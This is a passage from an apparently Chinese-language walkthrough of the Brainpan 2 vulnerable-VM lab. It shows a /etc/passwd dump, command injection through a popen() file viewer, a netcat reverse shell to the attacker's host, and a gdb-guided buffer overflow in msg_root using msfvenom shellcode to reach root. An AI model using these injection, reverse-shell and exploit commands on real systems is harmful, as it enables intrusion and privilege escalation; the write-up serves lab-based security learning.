FILE TO DOWNLOAD: /etc/passwd</span><br><span class="line">root:x:104:106:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">root :x:0:0:root:/var/root:/bin/bash</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:103::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash</span><br><span class="line">puck:x:1001:1001:puck,,,:/home/puck:/bin/bash</span><br><span class="line">reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; CREATE</span><br><span class="line">    ENTER FILE TO CREATE: /home/anansi/lucifer11   </span><br><span class="line">    ENTER CONTENTS: content\lucifer11testcontents</span><br><span class="line">    FILE CREATED</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11</span><br><span class="line">content\lucifer11testcontents</span><br></pre></td></tr></table></figure>

<p>这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTHENTICATION</span><br><span class="line">       There is currently no proper authentication mechanism <span class="keyword">in</span> place. At this</span><br><span class="line">       time  the software is <span class="keyword">in</span> it<span class="string">&#x27;s alpha stage. The only avaiable account is</span></span><br><span class="line"><span class="string">       GUEST. The DEBUG account will alter the output of some commands -  use\u2010</span></span><br><span class="line"><span class="string">       ful for developers.</span></span><br></pre></td></tr></table></figure>

<p>提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; DEBUG</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; SYSTEM</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HOME=/home/anansi</span><br><span class="line">COLORTERM=(null)</span><br><span class="line">PWD=/opt/brainpan</span><br><span class="line">PATH=/bin:.:/usr/bin:/sbin</span><br><span class="line">SHLVL=1</span><br></pre></td></tr></table></figure>

<p>在这里停止一下，总结一下已经了解的有关目标的知识：</p>
<ul>
<li>它以单个IP：192.168.57.1​​0运行（在我的情况下）</li>
<li>它有两个开放端口9999和10000</li>
<li>在端口10000上正在运行http服务器（此处无趣）</li>
<li>该http服务器基于Python，这意味着Python已安装并且可以使用</li>
<li>在端口9999上运行某些自定义文件传输</li>
<li>应用自定义应用程序不仅可以在应用程序根目录中提供读取/写入系统中文件的功能</li>
<li>该应用程序在/opt/brainpan中</li>
<li>对DEBUG用户的访问不受限制，因此可以完全访问该应用</li>
<li>从notes.txt中知道应用程序正在使用popen（）查看文件等。</li>
</ul>
<p>可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The <span class="built_in">command</span> argument is a pointer to a null-terminated string containing a shell <span class="built_in">command</span> line. This <span class="built_in">command</span> is passed to /bin/sh using the -c flag; interpretation, <span class="keyword">if</span> any, is performed by the shell.</span><br></pre></td></tr></table></figure>

<p>命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给/bin/sh；解释（如果有）由shell执行。</p>
<p>意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; VIEW  </span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; <span class="built_in">echo</span> <span class="string">&quot;some unexpected text lucifer11&quot;</span>;           </span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">some unexpected text lucifer11</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  </span><br><span class="line">          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:213 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>

<p>可以从输出看到;后面的命令已经被成功执行</p>
<p>创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                      &gt;&gt; VIEW</span><br><span class="line">ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666</span><br></pre></td></tr></table></figure>

<p>监听6666端口，成功的返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">anansi@brainpan2:/opt/brainpan$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)</span><br><span class="line">anansi@brainpan2:/opt/brainpan$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan2:/opt/brainpan$</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ ls  </span><br><span class="line">ls</span><br><span class="line">msg_root  readme.txt  startweb.sh  web</span><br><span class="line">anansi@brainpan2:/home/reynard$ ./msg_root</span><br><span class="line">./msg_root</span><br><span class="line">usage: msg_root username message</span><br></pre></td></tr></table></figure>

<p>anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:04] <span class="string">&quot;GET /msg_root HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ gdb msg_root</span><br><span class="line">gdb msg_root</span><br><span class="line">GNU gdb (GDB) 7.4.1-debian</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i486-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/reynard/msg_root...done.</span><br><span class="line"></span><br><span class="line">(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      </span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) BT</span><br><span class="line">BT</span><br><span class="line"><span class="comment">#0  0x61616161 in ?? ()</span></span><br><span class="line"><span class="comment">#1  0x0804872e in get_name (u=0xbffffe70 &#x27;a&#x27; &lt;repeats 108 times&gt;, </span></span><br><span class="line">    m=0xbffffedd <span class="string">&#x27;a&#x27;</span> &lt;repeats 87 <span class="built_in">times</span>&gt;) at msg_root.c:26</span><br><span class="line"><span class="comment">#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>已经在hte中检查了文件，并在其中找到了一些函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save_msg</span><br><span class="line">get_name</span><br><span class="line">main</span><br></pre></td></tr></table></figure>

<p>执行应用程序后，将转到：main -&gt; get_name -&gt; save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble get_name</span><br><span class="line">disassemble get_name</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> get_name:</span><br><span class="line">   0x080486a1 &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x080486a2 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x080486a4 &lt;+3&gt;:     sub    <span class="variable">$0x20</span>,%esp</span><br><span class="line">   0x080486a7 &lt;+6&gt;:     movl   <span class="variable">$0x804863c</span>,-0x4(%ebp)</span><br><span class="line">   0x080486ae &lt;+13&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486b1 &lt;+16&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486b4 &lt;+19&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x080486b9 &lt;+24&gt;:    cmp    <span class="variable">$0x11</span>,%eax</span><br><span class="line">   0x080486bc &lt;+27&gt;:    ja     0x80486d2 &lt;get_name+49&gt;</span><br><span class="line">   0x080486be &lt;+29&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486c1 &lt;+32&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486c5 &lt;+36&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486c8 &lt;+39&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486cb &lt;+42&gt;:    call   0x80484b0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080486d0 &lt;+47&gt;:    jmp    0x80486ec &lt;get_name+75&gt;</span><br><span class="line">   0x080486d2 &lt;+49&gt;:    movl   <span class="variable">$0x12</span>,0x8(%esp)</span><br><span class="line">   0x080486da &lt;+57&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486dd &lt;+60&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486e1 &lt;+64&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486e4 &lt;+67&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486e7 &lt;+70&gt;:    call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080486ec &lt;+75&gt;:    movl   <span class="variable">$0x7d0</span>,(%esp)</span><br><span class="line">   0x080486f3 &lt;+82&gt;:    call   0x80484c0 &lt;malloc@plt&gt;</span><br><span class="line">   0x080486f8 &lt;+87&gt;:    mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x080486fb &lt;+90&gt;:    mov    0xc(%ebp),%eax</span><br><span class="line">   0x080486fe &lt;+93&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048701 &lt;+96&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x08048706 &lt;+101&gt;:   mov    %eax,0x8(%esp)</span><br><span class="line">   0x0804870a &lt;+105&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804870d &lt;+108&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048711 &lt;+112&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048714 &lt;+115&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048717 &lt;+118&gt;:   call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x0804871c &lt;+123&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x0804871f &lt;+126&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048723 &lt;+130&gt;:   lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048726 &lt;+133&gt;:   mov    %eax,(%esp)</span><br><span class="line">==&gt;0x08048729 &lt;+136&gt;:   mov    -0x4(%ebp),%eax</span><br><span class="line">   0x0804872c &lt;+139&gt;:   call   *%eax</span><br><span class="line">   0x0804872e &lt;+141&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048731 &lt;+144&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048734 &lt;+147&gt;:   call   0x8048490 &lt;free@plt&gt;</span><br><span class="line">   0x08048739 &lt;+152&gt;:   leave  </span><br><span class="line">   0x0804873a &lt;+153&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。</p>
<p>这是用户提供有效输入时的场景：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x08048729</span><br><span class="line">b *0x08048729</span><br><span class="line">Breakpoint 1 at 0x8048729: file msg_root.c, line 26.</span><br><span class="line">(gdb) r aaaaaaa b</span><br><span class="line">r aaaaaaa b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaa b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff2b <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    m=0xbfffff33 <span class="string">&quot;b&quot;</span>) at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) x <span class="variable">$ebp</span>-4</span><br><span class="line">x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbffffd54:     0x0804863c</span><br><span class="line">(gdb) x/12xw <span class="variable">$esp</span></span><br><span class="line">x/12xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14</span><br><span class="line">0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33</span><br></pre></td></tr></table></figure>

<p>您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/8xw 0x0804a008</span><br><span class="line">x/8xw 0x0804a008</span><br><span class="line">0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;aaaaaaa&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) r a b</span><br><span class="line">r a b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root a b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff31 <span class="string">&quot;a&quot;</span>, m=0xbfffff33 <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) x/16xw <span class="variable">$esp</span></span><br><span class="line">x/16xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14</span><br><span class="line">0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33</span><br><span class="line">0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;a&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>

<p>有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：</p>
<p>对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan2<span class="comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -b &quot;x00&quot; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5e\x3f\x89\x9f\xe1&quot;</span></span><br></pre></td></tr></table></figure>

<p>填好二个参数,并执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure>

<p>读取flag看看，看起来好像成功了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">flag.txt  whatif.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">$ cat whatif.txt</span><br><span class="line">cat whatif.txt</span><br><span class="line"></span><br><span class="line">       WHAT IF I TOLD YOU</span><br><span class="line">              ___</span><br><span class="line">            /     \ </span><br><span class="line">           | ______\</span><br><span class="line">          (, \_/ \_/</span><br><span class="line">           |   ._. |</span><br><span class="line">           \   --- 